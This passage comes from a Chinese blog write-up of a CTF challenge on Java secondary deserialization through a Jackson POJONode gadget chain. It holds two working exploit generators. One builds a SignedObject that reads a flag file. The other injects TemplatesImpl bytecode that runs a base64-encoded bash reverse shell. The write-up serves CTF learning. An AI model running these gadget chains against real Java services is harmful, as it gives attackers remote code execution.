jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot; file:///flag_eddiemurphy&quot;</span>);<br>        <span class="hljs-comment">//URLHelper urlHelper = new URLHelper(&quot; file:///&quot;);</span><br>        <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br>        setFieldValue(urlHelper, <span class="hljs-string">&quot;visiter&quot;</span>, urlVisiter);<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp, jsonNodes);<br>        System.out.println(serial(exp));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211139099.png" srcset="/img/loading.gif" lazyload alt="image-20240803211139099"></p>
+<p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211143135.png" srcset="/img/loading.gif" lazyload alt="image-20240803211143135"></p>
+<p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211146962.png" srcset="/img/loading.gif" lazyload alt="image-20240803211146962"></p>
+<p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211151783.png" srcset="/img/loading.gif" lazyload alt="image-20240803211151783"></p>
+<p>第二个方法更神，因为直接RCE了。</p>
+<h2 id="TemplatesImpl恶意字节码"><a href="#TemplatesImpl恶意字节码" class="headerlink" title="TemplatesImpl恶意字节码"></a>TemplatesImpl恶意字节码</h2><p>这个方法甚至不需要它的URLHelper和URLVisiter，直接能反弹shell。</p>
+<p>思路来源是AliyunCTF2023的Bypassit1。</p>
+<p>不卖关子了，直接上：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] code = getTemplates();<span class="hljs-comment">//用javassist获取</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>,  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        System.out.println(serial(val));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;MyTemplate&quot;</span>);<br>        template.setSuperclass(pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        template.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> template.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>打一次hack即可，因为反序列化已经成功：</p>
+<p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211441966.png" srcset="/img/loading.gif" lazyload alt="image-20240803211441966"></p>
+<p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211445638.png" srcset="/img/loading.gif" lazyload alt="image-20240803211445638"></p>
+<p>二次反序列化的研究我会后续再单开一个文章，因为也非常具有研究价值。可看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13900?time__1311=GqmxnD2D97itqGNDQieBK4rci1LnEbD">浅谈Java二次反序列化 - 先知社区 (aliyun.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从巅峰极客2023Baby_URL看二次反序列化和Jackson原生链</div>
+      <div>https://eddiemurphy89.github.io/2024/08/03/从巅峰极客2023Baby-URL看二次反序列化和Jackson原生链/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>EddieMurphy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/03/SnakeYaml/" title="SnakeYaml">
+                        <span class="hidden-mobile">SnakeYaml</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
